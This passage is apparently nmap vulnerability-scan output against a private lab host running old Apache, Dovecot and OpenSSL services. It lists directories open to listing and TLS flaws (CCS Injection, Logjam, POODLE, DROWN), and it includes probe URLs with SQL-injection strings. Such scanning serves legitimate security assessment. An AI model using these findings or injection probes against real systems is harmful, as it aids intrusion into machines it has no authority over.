phpMyAdmin</span></span><br><span class="line"><span class="string">|   /css/: Potentially interesting directory w/ listing on &#x27;</span>apache/2.2.3 (centos)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">|   /docs/: Potentially interesting directory w/ listing on &#x27;</span>apache/2.2.3 (centos)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">|   /files/: Potentially interesting directory w/ listing on &#x27;</span>apache/2.2.3 (centos)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">|   /icons/: Potentially interesting directory w/ listing on &#x27;</span>apache/2.2.3 (centos)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">|   /inc/: Potentially interesting directory w/ listing on &#x27;</span>apache/2.2.3 (centos)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">|   /js/: Potentially interesting directory w/ listing on &#x27;</span>apache/2.2.3 (centos)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">|   /lib/: Potentially interesting directory w/ listing on &#x27;</span>apache/2.2.3 (centos)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">|   /manual/: Potentially interesting folder</span></span><br><span class="line"><span class="string">|   /sql/: Potentially interesting directory w/ listing on &#x27;</span>apache/2.2.3 (centos)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">|_  /templates/: Potentially interesting directory w/ listing on &#x27;</span>apache/2.2.3 (centos)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">|_http-server-header: Apache/2.2.3 (CentOS)</span></span><br><span class="line"><span class="string">| http-sql-injection: </span></span><br><span class="line"><span class="string">|   Possible sqli for queries:</span></span><br><span class="line"><span class="string">|     http://192.168.142.129:80/mail/program/js/?C=M%3bO%3dA%27%20OR%20sqlspider</span></span><br><span class="line"><span class="string">|     http://192.168.142.129:80/mail/program/js/?C=S%3bO%3dA%27%20OR%20sqlspider</span></span><br><span class="line"><span class="string">|     http://192.168.142.129:80/mail/program/js/?C=D%3bO%3dA%27%20OR%20sqlspider</span></span><br><span class="line"><span class="string">|_    http://192.168.142.129:80/mail/program/js/?C=N%3bO%3dD%27%20OR%20sqlspider</span></span><br><span class="line"><span class="string">|_http-stored-xss: Couldn&#x27;</span>t find any stored XSS vulnerabilities.</span><br><span class="line">|_http-trace: TRACE is enabled</span><br><span class="line">|_http-vuln-cve2014-3704: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">110/tcp  open  pop3       Dovecot pop3d</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| ssl-ccs-injection: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   SSL/TLS MITM vulnerability (CCS Injection)</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     Risk factor: High</span><br><span class="line">|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h</span><br><span class="line">|       does not properly restrict processing of ChangeCipherSpec messages,</span><br><span class="line">|       <span class="built_in">which</span> allows man-in-the-middle attackers to trigger use of a zero</span><br><span class="line">|       length master key <span class="keyword">in</span> certain OpenSSL-to-OpenSSL communications, and</span><br><span class="line">|       consequently hijack sessions or obtain sensitive information, via</span><br><span class="line">|       a crafted TLS handshake, aka the <span class="string">&quot;CCS Injection&quot;</span> vulnerability.</span><br><span class="line">|           </span><br><span class="line">|     References:</span><br><span class="line">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224</span><br><span class="line">|       http://www.openssl.org/news/secadv_20140605.txt</span><br><span class="line">|_      http://www.cvedetails.com/cve/2014-0224</span><br><span class="line">| ssl-dh-params: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Anonymous Diffie-Hellman Key Exchange MitM Vulnerability</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|       Transport Layer Security (TLS) services that use anonymous</span><br><span class="line">|       Diffie-Hellman key exchange only provide protection against passive</span><br><span class="line">|       eavesdropping, and are vulnerable to active man-in-the-middle attacks</span><br><span class="line">|       <span class="built_in">which</span> could completely compromise the confidentiality and integrity</span><br><span class="line">|       of any data exchanged over the resulting session.</span><br><span class="line">|     Check results:</span><br><span class="line">|       ANONYMOUS DH GROUP 1</span><br><span class="line">|             Cipher Suite: TLS_DH_anon_EXPORT_WITH_DES40_CBC_SHA</span><br><span class="line">|             Modulus Type: Safe prime</span><br><span class="line">|             Modulus Source: Unknown/Custom-generated</span><br><span class="line">|             Modulus Length: 512</span><br><span class="line">|             Generator Length: 8</span><br><span class="line">|             Public Key Length: 512</span><br><span class="line">|     References:</span><br><span class="line">|       https://www.ietf.org/rfc/rfc2246.txt</span><br><span class="line">|   </span><br><span class="line">|   Transport Layer Security (TLS) Protocol DHE_EXPORT Ciphers Downgrade MitM (Logjam)</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2015-4000  BID:74733</span><br><span class="line">|       The Transport Layer Security (TLS) protocol contains a flaw that is</span><br><span class="line">|       triggered when handling Diffie-Hellman key exchanges defined with</span><br><span class="line">|       the DHE_EXPORT cipher. This may allow a man-in-the-middle attacker</span><br><span class="line">|       to downgrade the security of a TLS session to 512-bit <span class="built_in">export</span>-grade</span><br><span class="line">|       cryptography, <span class="built_in">which</span> is significantly weaker, allowing the attacker</span><br><span class="line">|       to more easily <span class="built_in">break</span> the encryption and monitor or tamper with</span><br><span class="line">|       the encrypted stream.</span><br><span class="line">|     Disclosure date: 2015-5-19</span><br><span class="line">|     Check results:</span><br><span class="line">|       EXPORT-GRADE DH GROUP 1</span><br><span class="line">|             Cipher Suite: TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA</span><br><span class="line">|             Modulus Type: Safe prime</span><br><span class="line">|             Modulus Source: Unknown/Custom-generated</span><br><span class="line">|             Modulus Length: 512</span><br><span class="line">|             Generator Length: 8</span><br><span class="line">|             Public Key Length: 512</span><br><span class="line">|     References:</span><br><span class="line">|       https://weakdh.org</span><br><span class="line">|       https://www.securityfocus.com/bid/74733</span><br><span class="line">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4000</span><br><span class="line">|   </span><br><span class="line">|   Diffie-Hellman Key Exchange Insufficient Group Strength</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|       Transport Layer Security (TLS) services that use Diffie-Hellman groups</span><br><span class="line">|       of insufficient strength, especially those using one of a few commonly</span><br><span class="line">|       shared groups, may be susceptible to passive eavesdropping attacks.</span><br><span class="line">|     Check results:</span><br><span class="line">|       WEAK DH GROUP 1</span><br><span class="line">|             Cipher Suite: TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA</span><br><span class="line">|             Modulus Type: Safe prime</span><br><span class="line">|             Modulus Source: Unknown/Custom-generated</span><br><span class="line">|             Modulus Length: 1024</span><br><span class="line">|             Generator Length: 8</span><br><span class="line">|             Public Key Length: 1024</span><br><span class="line">|     References:</span><br><span class="line">|_      https://weakdh.org</span><br><span class="line">| ssl-poodle: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   SSL POODLE information leak</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2014-3566  BID:70574</span><br><span class="line">|           The SSL protocol 3.0, as used <span class="keyword">in</span> OpenSSL through 1.0.1i and other</span><br><span class="line">|           products, uses nondeterministic CBC padding, <span class="built_in">which</span> makes it easier</span><br><span class="line">|           <span class="keyword">for</span> man-in-the-middle attackers to obtain cleartext data via a</span><br><span class="line">|           padding-oracle attack, aka the <span class="string">&quot;POODLE&quot;</span> issue.</span><br><span class="line">|     Disclosure date: 2014-10-14</span><br><span class="line">|     Check results:</span><br><span class="line">|       TLS_RSA_WITH_AES_128_CBC_SHA</span><br><span class="line">|     References:</span><br><span class="line">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566</span><br><span class="line">|       https://www.imperialviolet.org/2014/10/14/poodle.html</span><br><span class="line">|       https://www.openssl.org/~bodo/ssl-poodle.pdf</span><br><span class="line">|_      https://www.securityfocus.com/bid/70574</span><br><span class="line">| sslv2-drown: </span><br><span class="line">|   ciphers: </span><br><span class="line">|     SSL2_RC2_128_CBC_WITH_MD5</span><br><span class="line">|     SSL2_RC4_128_EXPORT40_WITH_MD5</span><br><span class="line">|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5</span><br><span class="line">|     SSL2_DES_192_EDE3_CBC_WITH_MD5</span><br><span class="line">|     SSL2_RC4_128_WITH_MD5</span><br><span class="line">|   vulns: </span><br><span class="line">|     CVE-2016-0800: </span><br><span class="line">|       title: OpenSSL: Cross-protocol attack on TLS using SSLv2 (DROWN)</span><br><span class="line">|       state: VULNERABLE</span><br><span class="line">|       ids: </span><br><span class="line">|         CVE:CVE-2016-0800</span><br><span class="line">|       description: </span><br><span class="line">|               The SSLv2 protocol, as used <span class="keyword">in</span> OpenSSL before 1.0.1s and 1.0.2 before 1.0.2g and</span><br><span class="line">|       other products, requires a server to send a ServerVerify message before establishing</span><br><span class="line">|       that a client possesses certain plaintext RSA data, <span class="built_in">which</span> makes it easier <span class="keyword">for</span> remote</span><br><span class="line">|       attackers to decrypt TLS ciphertext data by leveraging a Bleichenbacher RSA padding</span><br><span class="line">|       oracle, aka a <span class="string">&quot;DROWN&quot;</span> attack.</span><br><span class="line">|     </span><br><span class="line">|       refs: </span><br><span class="line">|         https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-0800</span><br><span class="line">|_        https://www.openssl.org/news/secadv/20160301.txt</span><br><span class="line">111/tcp  open  rpcbind    2 (RPC <span class="comment">#100000)</span></span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">143/tcp  open  imap       Dovecot imapd</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| ssl-ccs-injection: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   SSL/TLS MITM vulnerability (CCS Injection)</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     Risk factor: High</span><br><span class="line">|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h</span><br><span class="line">|       does not properly restrict processing of ChangeCipherSpec messages,</span><br><span class="line">|       <span class="built_in">which</span> allows man-in-the-middle attackers to trigger use of a zero</span><br><span class="line">|       length master key <span class="keyword">in</span> certain OpenSSL-to-OpenSSL communications, and</span><br><span class="line">|       consequently hijack sessions or obtain sensitive information, via</span><br><span class="line">|       a crafted TLS handshake, aka the <span class="string">&quot;CCS Injection&quot;</span> vulnerability.</span><br><span class="line">|           </span><br><span class="line">|     References:</span><br><span class="line">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224</span><br><span class="line">|       http://www.openssl.org/news/secadv_20140605.txt</span><br><span class="line">|_      http://www.cvedetails.com/cve/2014-0224</span><br><span class="line">| ssl-dh-params: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Anonymous Diffie-Hellman Key Exchange MitM Vulnerability</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|       Transport Layer Security (TLS) services that use anonymous</span><br><span class="line">|       Diffie-Hellman key exchange only provide protection against passive</span><br><span class="line">|       eavesdropping, and are vulnerable to active man-in-the-middle attacks</span><br><span class="line">|       <span class="built_in">which</span> could completely compromise the confidentiality and integrity</span><br><span class="line">|       of any data exchanged over the resulting session.</span><br><span class="line">|     Check results:</span><br><span class="line">|       ANONYMOUS DH GROUP 1</span><br><span class="line">|             Cipher Suite: TLS_DH_anon_EXPORT_WITH_DES40_CBC_SHA</span><br><span class="line">|             Modulus Type: Safe prime</span><br><span class="line">|             Modulus Source: Unknown/Custom-generated</span><br><span class="line">|             Modulus Length: 512</span><br><span class="line">|             Generator Length: 8</span><br><span class="line">|             Public Key Length: 512</span><br><span class="line">|     References:</span><br><span class="line">|       https://www.ietf.org/rfc/rfc2246.txt</span><br><span class="line">|   </span><br><span class="line">|   Transport Layer Security (TLS) Protocol DHE_EXPORT Ciphers Downgrade MitM (Logjam)</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2015-4000  BID:74733</span><br><span class="line">|       The Transport Layer Security (TLS) protocol contains a flaw that is</span><br><span class="line">|       triggered when handling Diffie-Hellman key exchanges defined with</span><br><span class="line">|       the DHE_EXPORT cipher. This may allow a man-in-the-middle attacker</span><br><span class="line">|       to downgrade the security of a TLS session to 512-bit <span class="built_in">export</span>-grade</span><br><span class="line">|       cryptography, <span class="built_in">which</span> is significantly weaker, allowing the attacker</span><br><span class="line">|       to more easily <span class="built_in">break</span> the encryption and monitor or tamper with</span><br><span class="line">|       the encrypted stream.</span><br><span class="line">|     Disclosure date: 2015-5-19</span><br><span class="line">|     Check results:</span><br><span class="line">|       EXPORT-GRADE DH GROUP 1</span><br><span class="line">|             Cipher Suite: TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA</span><br><span class="line">|             Modulus Type: Safe prime</span><br><span class="line">|             Modulus Source: Unknown/Custom-generated</span><br><span class="line">|             Modulus Length: 512</span><br><span class="line">|             Generator Length: 8</span><br><span class="line">|             Public Key Length: 512</span><br><span class="line">|     References:</span><br><span class="line">|       https://weakdh.org</span><br><span class="line">|       https://www.securityfocus.com/bid/74733</span><br><span class="line">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4000</span><br><span class="line">|   </span><br><span class="line">|   Diffie-Hellman Key Exchange Insufficient Group Strength</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|       Transport Layer Security (TLS) services that use Diffie-Hellman groups</span><br><span class="line">|       of insufficient strength, especially those using one of a few commonly</span><br><span class="line">|       shared groups, may be susceptible to passive eavesdropping attacks.</span><br><span class="line">|     Check results:</span><br><span class="line">|       WEAK DH GROUP 1</span><br><span class="line">|             Cipher Suite: TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA</span><br><span class="line">|             Modulus Type: Safe prime</span><br><span class="line">|             Modulus Source: Unknown/Custom-generated</span><br><span class="line">|             Modulus Length: 1024</span><br><span class="line">|             Generator Length: 8</span><br><span class="line">|             Public Key Length: 1024</span><br><span class="line">|     References:</span><br><span class="line">|_      https://weakdh.org</span><br><span class="line">| ssl-poodle: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   SSL POODLE information leak</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2014-3566  BID:70574</span><br><span class="line">|           The SSL protocol 3.0, as used <span class="keyword">in</span> OpenSSL through 1.0.1i and other</span><br><span class="line">|           products, uses nondeterministic CBC padding, <span class="built_in">which</span> makes it easier</span><br><span class="line">|           <span class="keyword">for</span> man-in-the-middle attackers to obtain cleartext data via a</span><br><span class="line">|           padding-oracle attack, aka the <span class="string">&quot;POODLE&quot;</span> issue.</span><br><span class="line">|     Disclosure date: 2014-10-14</span><br><span class="line">|     Check results:</span><br><span class="line">|       TLS_RSA_WITH_AES_128_CBC_SHA</span><br><span class="line">|     References:</span><br><span class="line">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566</span><br><span class="line">|       https://www.imperialviolet.org/2014/10/14/poodle.html</span><br><span class="line">|       https://www.openssl.org/~bodo/ssl-poodle.pdf</span><br><span class="line">|_      https://www.securityfocus.com/bid/70574</span><br><span class="line">|_sslv2-drown: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">443/tcp  open  ssl/https?</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_http-aspnet-debug: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_http-csrf: Couldn<span class="string">&#x27;t find any CSRF vulnerabilities.</span></span><br><span class="line"><span class="string">|_http-dombased-xss: Couldn&#x27;</span>t find any DOM based XSS.</span><br><span class="line">|_http-stored-xss: Couldn<span class="string">&#x27;t find any stored XSS vulnerabilities.</span></span><br><span class="line"><span class="string">|_http-vuln-cve2014-3704: ERROR: Script execution failed (use -d to debug)</span></span><br><span class="line"><span class="string">| ssl-ccs-injection: </span></span><br><span class="line"><span class="string">|   VULNERABLE:</span></span><br><span class="line"><span class="string">|   SSL/TLS MITM vulnerability (CCS Injection)</span></span><br><span class="line"><span class="string">|     State: VULNERABLE</span></span><br><span class="line"><span class="string">|     Risk factor: High</span></span><br><span class="line"><span class="string">|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h</span></span><br><span class="line"><span class="string">|       does not properly restrict processing of ChangeCipherSpec messages,</span></span><br><span class="line"><span class="string">|       which allows man-in-the-middle attackers to trigger use of a zero</span></span><br><span class="line"><span class="string">|       length master key in certain OpenSSL-to-OpenSSL communications, and</span></span><br><span class="line"><span class="string">|       consequently hijack sessions or obtain sensitive information, via</span></span><br><span class="line"><span class="string">|       a crafted TLS handshake, aka the &quot;CCS Injection&quot; vulnerability.</span></span><br><span class="line"><span class="string">|           </span></span><br><span class="line"><span class="string">|     References:</span></span><br><span class="line"><span class="string">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224</span></span><br><span class="line"><span class="string">|       http://www.openssl.org/news/secadv_20140605.txt</span></span><br><span class="line"><span class="string">|_      http://www.cvedetails.com/cve/2014-0224</span></span><br><span class="line"><span class="string">| ssl-dh-params: </span></span><br><span class="line"><span class="string">|   VULNERABLE:</span></span><br><span class="line"><span class="string">|   Diffie-Hellman Key Exchange Insufficient Group Strength</span></span><br><span class="line"><span class="string">|     State: VULNERABLE</span></span><br><span class="line"><span class="string">|       Transport Layer Security (TLS) services that use Diffie-Hellman groups</span></span><br><span class="line"><span class="string">|       of insufficient strength, especially those using one of a few commonly</span></span><br><span class="line"><span class="string">|       shared groups, may be susceptible to passive eavesdropping attacks.</span></span><br><span class="line"><span class="string">|     Check results:</span></span><br><span class="line"><span class="string">|       WEAK DH GROUP 1</span></span><br><span class="line"><span class="string">|             Cipher Suite: TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA</span></span><br><span class="line"><span class="string">|             Modulus Type: Safe prime</span></span><br><span class="line"><span class="string">|             Modulus Source: mod_ssl 2.2.x/1024-bit MODP group with safe prime modulus</span></span><br><span class="line"><span class="string">|             Modulus Length: 1024</span></span><br><span class="line"><span class="string">|             Generator Length: 8</span></span><br><span class="line"><span class="string">|             Public Key Length: 1024</span></span><br><span class="line"><span class="string">|     References:</span></span><br><span class="line"><span class="string">|_      https://weakdh.org</span></span><br><span class="line"><span class="string">| ssl-poodle: </span></span><br><span class="line"><span class="string">|   VULNERABLE:</span></span><br><span class="line"><span class="string">|   SSL POODLE information leak</span></span><br><span class="line"><span class="string">|     State: VULNERABLE</span></span><br><span class="line"><span class="string">|     IDs:  CVE:CVE-2014-3566  BID:70574</span></span><br><span class="line"><span class="string">|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other</span></span><br><span class="line"><span class="string">|           products, uses nondeterministic CBC padding, which makes it easier</span></span><br><span class="line"><span class="string">|           for man-in-the-middle attackers to obtain cleartext data via a</span></span><br><span class="line"><span class="string">|           padding-oracle attack, aka the &quot;POODLE&quot; issue.</span></span><br><span class="line"><span class="string">|     Disclosure date: 2014-10-14</span></span><br><span class="line"><span class="string">|     Check results:</span></span><br><span class="line"><span class="string">|       TLS_RSA_WITH_AES_128_CBC_SHA</span></span><br><span class="line"><span class="string">|     References:</span></span><br><span class="line"><span class="string">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566</span></span><br><span class="line"><span class="string">|       https://www.imperialviolet.org/2014/10/14/poodle.html</span></span><br><span class="line"><span class="string">|       https://www.openssl.org/~bodo/ssl-poodle.pdf</span></span><br><span class="line"><span class="string">|_      https://www.securityfocus.com/bid/70574</span></span><br><span class="line"><span class="string">|_sslv2-drown: </span></span><br><span class="line"><span class="string">993/tcp  open  ssl/imaps?</span></span><br><span class="line"><span class="string">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span></span><br><span class="line"><span class="string">| ssl-ccs-injection: </span></span><br><span class="line"><span class="string">|   VULNERABLE:</span></span><br><span class="line"><span class="string">|   SSL/TLS MITM vulnerability (CCS Injection)</span></span><br><span class="line"><span class="string">|     State: VULNERABLE</span></span><br><span class="line"><span class="string">|     Risk factor: High</span></span><br><span class="line"><span class="string">|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h</span></span><br><span class="line"><span class="string">|       does not properly restrict processing of ChangeCipherSpec messages,</span></span><br><span class="line"><span class="string">|       which allows man-in-the-middle attackers to trigger use of a zero</span></span><br><span class="line"><span class="string">|       length master key in certain OpenSSL-to-OpenSSL communications, and</span></span><br><span class="line"><span class="string">|       consequently hijack sessions or obtain sensitive information, via</span></span><br><span class="line"><span class="string">|       a crafted TLS handshake, aka the &quot;CCS Injection&quot; vulnerability.</span></span><br><span class="line"><span class="string">|           </span></span><br><span class="line"><span class="string">|     References:</span></span><br><span class="line"><span class="string">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224</span></span><br><span class="line"><span class="string">|       http://www.openssl.org/news/secadv_20140605.txt</span></span><br><span class="line"><span class="string">|_      http://www.cvedetails.com/cve/2014-0224</span></span><br><span class="line"><span class="string">| ssl-dh-params: </span></span><br><span class="line"><span class="string">|   VULNERABLE:</span></span><br><span class="line"><span class="string">|   Anonymous Diffie-Hellman Key Exchange MitM Vulnerability</span></span><br><span class="line"><span class="string">|     State: VULNERABLE</span></span><br><span class="line"><span class="string">|       Transport Layer Security (TLS) services that use anonymous</span></span><br><span class="line"><span class="string">|       Diffie-Hellman key exchange only provide protection against passive</span></span><br><span class="line"><span class="string">|       eavesdropping, and are vulnerable to active man-in-the-middle attacks</span></span><br><span class="line"><span class="string">|       which could completely compromise the confidentiality and integrity</span></span><br><span class="line"><span class="string">|       of any data exchanged over the resulting session.</span></span><br><span class="line"><span class="string">|     Check results:</span></span><br><span class="line"><span class="string">|       ANONYMOUS DH GROUP 1</span></span><br><span class="line"><span class="string">|             Cipher Suite: TLS_DH_anon_EXPORT_WITH_DES40_CBC_SHA</span></span><br><span class="line"><span class="string">|             Modulus Type: Safe prime</span></span><br><span class="line"><span class="string">|             Modulus Source: Unknown/Custom-generated</span></span><br><span class="line"><span class="string">|             Modulus Length: 512</span></span><br><span class="line"><span class="string">|             Generator Length: 8</span></span><br><span class="line"><span class="string">|             Public Key Length: 512</span></span><br><span class="line"><span class="string">|     References:</span></span><br><span class="line"><span class="string">|       https://www.ietf.org/rfc/rfc2246.txt</span></span><br><span class="line"><span class="string">|   </span></span><br><span class="line"><span class="string">|   Transport Layer Security (TLS) Protocol DHE_EXPORT Ciphers Downgrade MitM (Logjam)</span></span><br><span class="line"><span class="string">|     State: VULNERABLE</span></span><br><span class="line"><span class="string">|     IDs:  CVE:CVE-2015-4000  BID:74733</span></span><br><span class="line"><span class="string">|       The Transport Layer Security (TLS) protocol contains a flaw that is</span></span><br><span class="line"><span class="string">|       triggered when handling Diffie-Hellman key exchanges defined with</span></span><br><span class="line"><span class="string">|       the DHE_EXPORT cipher. This may allow a man-in-the-middle attacker</span></span><br><span class="line"><span class="string">|       to downgrade the security of a TLS session to 512-bit export-grade</span></span><br><span class="line"><span class="string">|       cryptography, which is significantly weaker, allowing the attacker</span></span><br><span class="line"><span class="string">|       to more easily break the encryption and monitor or tamper with</span></span><br><span class="line"><span class="string">|       the encrypted stream.</span></span><br><span class="line"><span class="string">|     Disclosure date: 2015-5-19</span></span><br><span class="line"><span class="string">|     Check results:</span></span><br><span class="line"><span class="string">|       EXPORT-GRADE DH GROUP 1</span></span><br><span class="line"><span class="string">|             Cipher Suite: TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA</span></span><br><span class="line"><span class="string">|             Modulus Type: Safe prime</span></span><br><span class="line"><span class="string">|             Modulus Source: Unknown/Custom-generated</span></span><br><span class="line"><span class="string">|             Modulus Length: 512</span></span><br><span class="line"><span class="string">|             Generator Length: 8</span></span><br><span class="line"><span class="string">|             Public Key Length: 512</span></span><br><span class="line"><span class="string">|     References:</span></span><br><span class="line"><span class="string">|       https://weakdh.org</span></span><br><span class="line"><span class="string">|       https://www.securityfocus.com/bid/74733</span></span><br><span class="line"><span class="string">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4000</span></span><br><span class="line"><span class="string">|   </span></span><br><span class="line"><span class="string">|   Diffie-Hellman Key Exchange Insufficient Group Strength</span></span><br><span class="line"><span class="string">|     State: VULNERABLE</span></span><br><span class="line"><span class="string">|       Transport Layer Security (TLS) services that use Diffie-Hellman groups</span></span><br><span class="line"><span class="string">|       of insufficient strength, especially those using one of a few commonly</span></span><br><span class="line"><span class="string">|       shared groups, may be susceptible to passive eavesdropping attacks.</span></span><br><span class="line"><span class="string">|     Check results:</span></span><br><span class="line"><span class="string">|       WEAK DH GROUP 1</span></span><br><span class="line"><span class="string">|             Cipher Suite: TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA</span></span><br><span class="line"><span class="string">|             Modulus Type: Safe prime</span></span><br><span class="line"><span class="string">|             Modulus Source: Unknown/Custom-generated</span></span><br><span class="line"><span class="string">|             Modulus Length: 1024</span></span><br><span class="line"><span class="string">|             Generator Length: 8</span></span><br><span class="line"><span class="string">|             Public Key Length: 1024</span></span><br><span class="line"><span class="string">|     References:</span></span><br><span class="line"><span class="string">|_      https://weakdh.org</span></span><br><span class="line"><span class="string">| ssl-poodle: </span></span><br><span class="line"><span class="string">|   VULNERABLE:</span></span><br><span class="line"><span class="string">|   SSL POODLE information leak</span></span><br><span class="line"><span class="string">|     State: VULNERABLE</span></span><br><span class="line"><span class="string">|     IDs:  CVE:CVE-2014-3566  BID:70574</span></span><br><span class="line"><span class="string">|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other</span></span><br><span class="line"><span class="string">|           products, uses nondeterministic CBC padding, which makes it easier</span></span><br><span class="line"><span class="string">|           for man-in-the-middle attackers to obtain cleartext data via a</span></span><br><span class="line"><span class="string">|           padding-oracle attack, aka the &quot;POODLE&quot; issue.</span></span><br><span class="line"><span class="string">|     Disclosure date: 2014-10-14</span></span><br><span class="line"><span class="string">|     Check results:</span></span><br><span class="line"><span class="string">|       TLS_RSA_WITH_AES_128_CBC_SHA</span></span><br><span class="line"><span class="string">|     References:</span></span><br><span class="line"><span class="string">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566</span></span><br><span class="line"><span class="string">|       https://www.imperialviolet.org/2014/10/14/poodle.html</span></span><br><span class="line"><span class="string">|       https://www.openssl.org/~bodo/ssl-poodle.pdf</span></span><br><span class="line"><span class="string">|_      https://www.securityfocus.com/bid/70574</span></span><br><span class="line"><span class="string">| sslv2-drown: </span></span><br><span class="line"><span class="string">|   ciphers: </span></span><br><span class="line"><span class="string">|     SSL2_RC2_128_CBC_WITH_MD5</span></span><br><span class="line"><span class="string">|     SSL2_RC4_128_EXPORT40_WITH_MD5</span></span><br><span class="line"><span class="string">|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5</span></span><br><span class="line"><span class="string">|     SSL2_DES_192_EDE3_CBC_WITH_MD5</span></span><br><span class="line"><span class="string">|     SSL2_RC4_128_WITH_MD5</span></span><br><span class="line"><span class="string">|   vulns: </span></span><br><span class="line"><span class="string">|     CVE-2016-0800: </span></span><br><span class="line"><span class="string">|       title: OpenSSL: Cross-protocol attack on TLS using SSLv2 (DROWN)</span></span><br><span class="line"><span class="string">|       state: VULNERABLE</span></span><br><span class="line"><span class="string">|       ids: </span></span><br><span class="line"><span class="string">|         CVE:CVE-2016-0800</span></span><br><span class="line"><span class="string">|       description: </span></span><br><span class="line"><span class="string">|               The SSLv2 protocol, as used in OpenSSL before 1.0.1s and 1.0.2 before 1.0.2g and</span></span><br><span class="line"><span class="string">|       other products, requires a server to send a ServerVerify message before establishing</span></span><br><span class="line"><span class="string">|       that a client possesses certain plaintext RSA data, which makes it easier for remote</span></span><br><span class="line"><span class="string">|       attackers to decrypt TLS ciphertext data by leveraging a Bleichenbacher RSA padding</span></span><br><span class="line"><span class="string">|       oracle, aka a &quot;DROWN&quot; attack.</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|       refs: </span></span><br><span class="line"><span class="string">|         https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-0800</span></span><br><span class="line"><span class="string">|_        https://www.openssl.org/news/secadv/20160301.txt</span></span><br><span class="line"><span class="string">995/tcp  open  ssl/pop3s?</span></span><br><span class="line"><span class="string">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span></span><br><span class="line"><span class="string">| ssl-ccs-injection: </span></span><br><span class="line"><span class="string">|   VULNERABLE:</span></span><br><span class="line"><span class="string">|   SSL/TLS MITM vulnerability (CCS Injection)</span></span><br><span class="line"><span class="string">|     State: VULNERABLE</span></span><br><span class="line"><span class="string">|     Risk factor: High</span></span><br><span class="line"><span class="string">|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h</span></span><br><span class="line"><span class="string">|       does not properly restrict processing of ChangeCipherSpec messages,</span></span><br><span class="line"><span class="string">|       which allows man-in-the-middle attackers to trigger use of a zero</span></span><br><span class="line"><span class="string">|       length master key in certain OpenSSL-to-OpenSSL communications, and</span></span><br><span class="line"><span class="string">|       consequently hijack sessions or obtain sensitive information, via</span></span><br><span class="line"><span class="string">|       a crafted TLS handshake, aka the &quot;CCS Injection&quot; vulnerability.</span></span><br><span class="line"><span class="string">|           </span></span><br><span class="line"><span class="string">|     References:</span></span><br><span class="line"><span class="string">|       